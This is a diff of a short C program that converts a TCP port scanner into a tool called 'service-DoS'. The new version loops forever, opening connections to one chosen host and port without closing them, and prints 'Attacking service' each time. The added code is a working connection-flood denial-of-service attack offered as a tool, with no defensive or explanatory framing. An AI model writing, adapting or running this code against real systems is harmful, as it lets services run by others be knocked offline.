@@ -4,20 +4,19 @@
 
 int main(int argc, char *argv[]) {
 
-    if (argc <= 1) {
-        printf("Usage: ./port-scan <host>\n");
+    if (argc < 3) {
+        printf("Usage: ./service-DoS <host> <port>\n");
         return 0;
     } else {
         int my_socket;
         int connection;
 
-        int port;
-        char *host;
-        host = argv[1];
+        char *host = argv[1];
+        int port = atoi(argv[2]);
 
         struct sockaddr_in target;
 
-        for(port=1;port<=65535;port++) {
+        while(1) {
             my_socket = socket(AF_INET,SOCK_STREAM,0);
             target.sin_family = AF_INET;
             target.sin_port = htons(port);
@@ -25,14 +24,7 @@ int main(int argc, char *argv[]) {
 
             connection = connect(my_socket, (struct sockaddr *)&target, sizeof target);
 
-            if (connection == 0) {
-                printf("Port %d - status [OPEN]\n", port);
-                close(my_socket);
-                close(connection);
-            } else {
-                close(my_socket);
-                close(connection);
-            }
+            printf("Attacking service running on %s:%d\n", host, port);
         }
     }
 
